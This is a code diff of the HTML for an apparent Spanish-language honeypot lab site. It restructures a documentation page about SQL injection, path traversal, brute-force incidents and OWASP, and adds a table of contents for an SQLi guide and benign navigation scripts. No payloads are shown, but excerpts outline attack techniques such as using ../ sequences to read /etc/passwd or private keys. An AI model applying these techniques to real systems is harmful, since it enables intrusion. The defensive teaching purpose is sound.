+        <h3 class="side-title">Índice</h3>
+        <nav class="toc-nav" aria-label="Tabla de contenidos">
+          <a href="#introduccion">1. Introducción SQLi</a>
+          <a href="#metodologias">2. Metodologías</a>
+          <a href="#union">· UNION-based</a>
+          <a href="#blind">· Blind SQLi</a>
+          <a href="#enum">· Enumeración</a>
+          <a href="#cheat-sheet">3. Cheat Sheet</a>
+          <a href="#blue-team">4. Blue Team</a>
+        </nav>
+      </div>
+      <div class="doc-card glass-card fade-in-blur">
+        <h3 class="side-title">Acceso rápido</h3>
+        <div class="quick-links">
+          <a href="/objetivos">Laboratorio CTF <span>→</span></a>
+          <a href="/search">Buscador honeypot <span>→</span></a>
+          <a href="/blog">Blog corporativo <span>→</span></a>
         </div>
-        <button class="read-more">Leer informe →</button>
-      </article>
-
-      <article class="article" data-cat="informe">
-        <span class="pill informe">Informe</span>
-        <h2 class="article-title">Informe de Incidente — Campaña de Fuerza Bruta 03/06/2026</h2>
-        <div class="article-meta">03 jun 2026<span class="sep">·</span>8 min de lectura<span class="sep">·</span>Angel García</div>
-        <div class="tags"><span class="tag">Fuerza Bruta</span><span class="tag">Incidente</span><span class="tag">NIS2</span></div>
-        <p class="excerpt">Campaña sostenida de fuerza bruta contra /login durante 4 horas consecutivas. 2.341 intentos desde 3 IPs rotantes con intervalos de 800ms. Se activó bloqueo automático a los 47 intentos por IP.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>Cronología del incidente</li>
-            <li>IPs atacantes y geolocalización</li>
-            <li>Patrones detectados</li>
-            <li>Respuesta aplicada</li>
-            <li>Lecciones aprendidas</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer informe →</button>
-      </article>
-    </section>
-
-    <!-- VULNERABILIDADES -->
-    <section class="cat-section" data-cat="vulnerabilidad">
-      <header class="cat-header">
-        <span class="pill vulnerabilidad">Vulnerabilidad</span>
-        <span class="cat-title">Vulnerabilidades</span>
-        <span class="cat-count">· 2 documentos</span>
-      </header>
-
-      <article class="article" data-cat="vulnerabilidad">
-        <span class="pill vulnerabilidad">Vulnerabilidad</span>
-        <h2 class="article-title">SQL Injection — Extracción de datos con UNION</h2>
-        <div class="article-meta">15 may 2026<span class="sep">·</span>18 min de lectura</div>
-        <div class="tags"><span class="tag">SQLi</span><span class="tag">OWASP A03</span><span class="tag">Crítica</span></div>
-        <p class="excerpt">La inyección SQL mediante cláusulas UNION permite al atacante alinear columnas de tablas arbitrarias con la consulta original. Explicamos detección, explotación y mitigación con ejemplos reales capturados en el honeypot.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>¿Qué es SQL Injection?</li>
-            <li>Tipos: error-based, blind, UNION</li>
-            <li>Técnica UNION-based paso a paso</li>
-            <li>Payloads comunes</li>
-            <li>Detección en logs</li>
-            <li>Mitigación y consultas seguras</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer artículo →</button>
-      </article>
-
-      <article class="article" data-cat="vulnerabilidad">
-        <span class="pill vulnerabilidad">Vulnerabilidad</span>
-        <h2 class="article-title">Path Traversal — Lectura de archivos del sistema</h2>
-        <div class="article-meta">22 may 2026<span class="sep">·</span>14 min de lectura</div>
-        <div class="tags"><span class="tag">LFI</span><span class="tag">Path Traversal</span><span class="tag">Alta</span></div>
-        <p class="excerpt">El path traversal permite navegar fuera del directorio raíz de la aplicación usando secuencias ../ para leer archivos sensibles del sistema como /etc/passwd o claves privadas.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>Concepto y alcance</li>
-            <li>Vectores de ataque</li>
-            <li>Bypass de filtros comunes</li>
-            <li>Archivos objetivo frecuentes</li>
-            <li>Ejemplos reales del honeypot</li>
-            <li>Remediación</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer artículo →</button>
-      </article>
-    </section>
-
-    <!-- TEORÍA -->
-    <section class="cat-section" data-cat="teoria">
-      <header class="cat-header">
-        <span class="pill teoria">Teoría</span>
-        <span class="cat-title">Teoría</span>
-        <span class="cat-count">· 2 documentos</span>
-      </header>
-
-      <article class="article" data-cat="teoria">
-        <span class="pill teoria">Teoría</span>
-        <h2 class="article-title">Cómo funciona un Honeypot — Arquitectura y propósito</h2>
-        <div class="article-meta">01 may 2026<span class="sep">·</span>20 min de lectura</div>
-        <div class="tags"><span class="tag">Honeypot</span><span class="tag">Blue Team</span><span class="tag">Arquitectura</span></div>
-        <p class="excerpt">Un honeypot es un sistema diseñado para ser atacado. Analizamos los tipos de honeypot (low-interaction, high-interaction), su papel en la estrategia defensiva y cómo FlyPaper implementa cada concepto.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>Definición y clasificación</li>
-            <li>Low vs high interaction</li>
-            <li>Honeynets</li>
-            <li>Casos de uso en SOC</li>
-            <li>Arquitectura de FlyPaper</li>
-            <li>Métricas y análisis</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer artículo →</button>
-      </article>
-
-      <article class="article" data-cat="teoria">
-        <span class="pill teoria">Teoría</span>
-        <h2 class="article-title">OWASP Top 10 — Guía práctica con ejemplos reales</h2>
-        <div class="article-meta">10 may 2026<span class="sep">·</span>25 min de lectura</div>
-        <div class="tags"><span class="tag">OWASP</span><span class="tag">Teoría</span><span class="tag">Fundamentos</span></div>
-        <p class="excerpt">Recorremos las diez categorías de riesgo más críticas según OWASP, ilustradas con eventos reales capturados en el laboratorio FlyPaper. De A01 a A10 con ejemplos de payloads y patrones de detección.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>A01 — Control de acceso</li>
-            <li>A02 — Fallos criptográficos</li>
-            <li>A03 — Inyección</li>
-            <li>A04 — Diseño inseguro</li>
-            <li>A05 — Configuración incorrecta</li>
-            <li>A06 a A10</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer artículo →</button>
-      </article>
-    </section>
-
-    <!-- APUNTES -->
-    <section class="cat-section" data-cat="apuntes">
-      <header class="cat-header">
-        <span class="pill apuntes">Apuntes</span>
-        <span class="cat-title">Apuntes</span>
-        <span class="cat-count">· 1 documento</span>
-      </header>
-
-      <article class="article" data-cat="apuntes">
-        <span class="pill apuntes">Apuntes</span>
-        <h2 class="article-title">Apuntes: Herramientas esenciales para análisis de tráfico</h2>
-        <div class="article-meta">28 may 2026<span class="sep">·</span>10 min de lectura</div>
-        <div class="tags"><span class="tag">Herramientas</span><span class="tag">Wireshark</span><span class="tag">Burp Suite</span></div>
-        <p class="excerpt">Resumen de comandos y configuraciones para Wireshark, Burp Suite y curl orientados al análisis de tráfico web malicioso. Incluye filtros BPF para aislar ataques SQLi y XSS en capturas.</p>
-        <div class="toc">
-          <div class="toc-title">Índice del documento</div>
-          <ol>
-            <li>Wireshark — filtros útiles</li>
-            <li>Burp Suite — interceptación</li>
-            <li>curl para reproducir ataques</li>
-            <li>Análisis de User-Agents</li>
-            <li>Correlación de eventos</li>
-          </ol>
-        </div>
-        <button class="read-more">Leer apuntes →</button>
-      </article>
-    </section>
-
+      </div>
+    </aside>
   </div>
-
-  <!-- SIDEBAR -->
-  <aside class="sidebar">
-    <div class="side-block">
-      <h3 class="side-title">Buscar</h3>
-      <div class="doc-search">
-        <input type="text" placeholder="Buscar en la documentación..." />
-        <button aria-label="Buscar">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
-        </button>
-      </div>
-    </div>
-
-    <div class="side-block">
-      <h3 class="side-title">Categorías</h3>
-      <div class="cat-list">
-        <button class="cat-btn active" data-filter="all"><span class="swatch" style="background:var(--muted)"></span>Todas<span class="count">7</span></button>
-        <button class="cat-btn" data-filter="informe"><span class="swatch" style="background:var(--red)"></span>Informes<span class="count">2</span></button>
-        <button class="cat-btn" data-filter="vulnerabilidad"><span class="swatch" style="background:var(--amber)"></span>Vulnerabilidades<span class="count">2</span></button>
-        <button class="cat-btn" data-filter="teoria"><span class="swatch" style="background:var(--blue)"></span>Teoría<span class="count">2</span></button>
-        <button class="cat-btn" data-filter="apuntes"><span class="swatch" style="background:var(--green)"></span>Apuntes<span class="count">1</span></button>
-      </div>
-    </div>
-
-    <div class="side-block">
-      <h3 class="side-title">Etiquetas más usadas</h3>
-      <div class="tagcloud">
-        <span class="tag">SQLi</span><span class="tag">XSS</span><span class="tag">Honeypot</span>
-        <span class="tag">OWASP</span><span class="tag">Blue Team</span><span class="tag">NIS2</span>
-        <span class="tag">Fuerza Bruta</span><span class="tag">Path Traversal</span>
-        <span class="tag">Incidente</span><span class="tag">Análisis</span>
-      </div>
-    </div>
-
-    <div class="side-block">
-      <h3 class="side-title">Últimas actualizaciones</h3>
-      <ul class="updates">
-        <li><time>08 jun 2026</time><a href="#">Análisis de tráfico bot — Mayo 2026</a></li>
-        <li><time>03 jun 2026</time><a href="#">Incidente: campaña de fuerza bruta</a></li>
-        <li><time>28 may 2026</time><a href="#">Herramientas para análisis de tráfico</a></li>
-        <li><time>22 may 2026</time><a href="#">Path Traversal — lectura de archivos</a></li>
-        <li><time>15 may 2026</time><a href="#">SQL Injection con UNION</a></li>
-      </ul>
-    </div>
-
-    <div class="side-block">
-      <h3 class="side-title">Acceso rápido</h3>
-      <div class="quick">
-        <a href="/objetivos">Ver el laboratorio <span>→</span></a>
-        <a href="/search">Ir al buscador <span>→</span></a>
-      </div>
-    </div>
-  </aside>
-    </div>
-
-    <div class="page-footer">FlyPaper Corp © 2026 — Entorno de laboratorio. Todo el tráfico es registrado y analizado.</div>
-  </main>
+</main>
 
 <script>
-  // Filtro por categoría
-  const btns = document.querySelectorAll('.cat-btn');
-  const sections = document.querySelectorAll('.cat-section');
-  function applyFilter(f){
-    btns.forEach(b => b.classList.toggle('active', b.dataset.filter === f));
-    sections.forEach(s => {
-      s.classList.toggle('hidden', !(f === 'all' || s.dataset.cat === f));
+(function () {
+  var btn = document.getElementById('btn-focus-sqlite');
+  if (btn) {
+    btn.addEventListener('click', function () {
+      var activo = document.body.classList.toggle('sheet-focus-sqlite');
+      btn.setAttribute('aria-pressed', activo ? 'true' : 'false');
+      btn.textContent = activo ? 'Mostrar todos los DBMS' : 'Enfocar solo SQLite';
     });
   }
-  btns.forEach(b => b.addEventListener('click', () => applyFilter(b.dataset.filter)));
+
+  var links = document.querySelectorAll('.toc-nav a');
+  var sections = [];
+  links.forEach(function (a) {
+    var id = (a.getAttribute('href') || '').slice(1);
+    var el = document.getElementById(id);
+    if (el) sections.push({ id: id, el: el, link: a });
+  });
+
+  function marcarActivo() {
+    var y = window.scrollY + 120;
+    var actual = sections[0];
+    sections.forEach(function (s) {
+      if (s.el.offsetTop <= y) actual = s;
+    });
+    links.forEach(function (a) { a.classList.remove('is-active'); });
+    if (actual) actual.link.classList.add('is-active');
+  }
+  window.addEventListener('scroll', marcarActivo, { passive: true });
+  marcarActivo();
+})();
 </script>
 </body>
 </html>
